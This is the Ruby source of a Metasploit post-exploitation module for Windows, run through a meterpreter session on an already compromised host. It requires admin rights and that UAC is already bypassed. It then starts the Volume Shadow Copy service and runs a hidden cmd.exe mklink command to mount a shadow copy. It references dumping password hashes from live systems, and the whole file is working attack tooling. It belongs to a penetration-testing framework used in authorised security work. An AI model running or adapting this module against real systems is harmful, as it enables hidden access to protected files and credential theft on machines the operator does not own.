##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Manage Mount Shadow Copy",
      'Description'          => %q{
        This module will attempt to mount a Volume Shadow Copy
        on the system. This is based on the VSSOwn Script
        originally posted by Tim Tomes and Mark Baggett.

        Works on win2k3 and later.
        },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['theLightCosine'],
      'References'    => [
        [ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ]
      ]
    ))
    register_options(
      [
        OptString.new('DEVICE', [ true, 'DeviceObject of Shadowcopy to mount.' ]),
        OptString.new('PATH', [ true, 'Path to mount it to.' ])
      ])

  end


  def run
    unless is_admin?
      print_error("This module requires admin privs to run")
      return
    end
    if is_uac_enabled?
      print_error("This module requires UAC to be bypassed first")
      return
    end
    unless start_vss
      return
    end

    r = session.sys.process.execute("cmd.exe /C mklink /D #{datastore['DEVICE']} #{datastore['PATH']}", nil, {'Hidden' => true})

  end
end
